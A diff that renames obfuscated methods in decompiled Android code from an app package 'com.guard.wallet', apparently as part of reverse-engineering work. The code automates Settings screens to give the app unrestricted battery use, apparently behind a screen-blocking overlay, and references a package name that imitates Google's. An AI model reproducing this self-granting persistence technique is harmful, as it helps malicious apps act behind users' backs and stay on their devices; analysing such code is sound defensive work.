@@ -35,7 +35,7 @@ public final class PermissionGrantTask implements Runnable {
                 /* keepAliveInAppDetail — find and click battery management item */
                 var5.getClass();
                 try {
-                    if (!var5.i0()) {
+                    if (!var5.isInAppDetail()) {
                         return;
                     }
                     Log.d("o.g", "keepAliveInAppDetail 窗口匹配");
@@ -47,12 +47,12 @@ public final class PermissionGrantTask implements Runnable {
                     UiObject target;
                     if (scrollView != null) {
                         Log.d("o.g", "应用详情窗口滚动视图查找成功");
-                        target = var5.l0(scrollView);
+                        target = var5.scrollFindBatteryEntry(scrollView);
                     } else {
                         Log.e("o.g", "应用详情窗口滚动视图查找失败");
-                        target = var5.k().findOneByCombine(com.guard.wallet.engine.AospKeepAliveEngine.c0());
+                        target = var5.k().findOneByCombine(com.guard.wallet.engine.AospKeepAliveEngine.buildBatteryFilter());
                         if (target == null) {
-                            target = var5.k().findOneByCombine(com.guard.wallet.engine.AospKeepAliveEngine.f0());
+                            target = var5.k().findOneByCombine(com.guard.wallet.engine.AospKeepAliveEngine.buildPowerFilter());
                         }
                     }
 
@@ -77,14 +77,14 @@ public final class PermissionGrantTask implements Runnable {
                 /* keepAliveInAppBattery — set unrestricted battery usage */
                 var5.getClass();
                 try {
-                    if (!var5.h0()) {
+                    if (!var5.isInBatteryManagement()) {
                         return;
                     }
                     Log.d("o.g", "keepAliveInAppBattery 窗口匹配");
                     com.guard.wallet.helper.BlockViewManager.h(40);
                     var5.G();
                     Log.d("o.g", "active root complete");
-                    UiObject radioBtn = var5.k().findOneByOperateOr(com.guard.wallet.engine.AospKeepAliveEngine.o0());
+                    UiObject radioBtn = var5.k().findOneByOperateOr(com.guard.wallet.engine.AospKeepAliveEngine.buildUnrestrictedOrFilter());
 
                     boolean var37 = true;
                     ConcurrentLinkedQueue var8 = var5.n;
@@ -111,7 +111,7 @@ public final class PermissionGrantTask implements Runnable {
                             }
                         }
                     } else {
-                        CombineFilter b0Filter = com.guard.wallet.engine.AospKeepAliveEngine.b0();
+                        CombineFilter b0Filter = com.guard.wallet.engine.AospKeepAliveEngine.buildAllowBackgroundFilter();
                         if (b0Filter != null) {
                             com.guard.wallet.helper.BlockViewManager.h(40);
                             UiObject item = var5.k().findOneByCombine(b0Filter);
@@ -146,7 +146,7 @@ public final class PermissionGrantTask implements Runnable {
                     com.guard.wallet.delegate.ScreenCaptureManager.e backupEnum = com.guard.wallet.delegate.ScreenCaptureManager.e.d;
 
                     if (isMainApp) {
-                        var5.n0(MainApplication.getAppContext().getPackageName());
+                        var5.savePowerControlState(MainApplication.getAppContext().getPackageName());
                         var8.clear();
                         var6.set(false);
                         var4.set(false);
@@ -163,7 +163,7 @@ public final class PermissionGrantTask implements Runnable {
                         if (!Objects.equals(var52.get(), backupEnum)) {
                             return;
                         }
-                        var5.n0("com.google.guard");
+                        var5.savePowerControlState("com.google.guard");
                     }
                     var5.Z();
                     return;
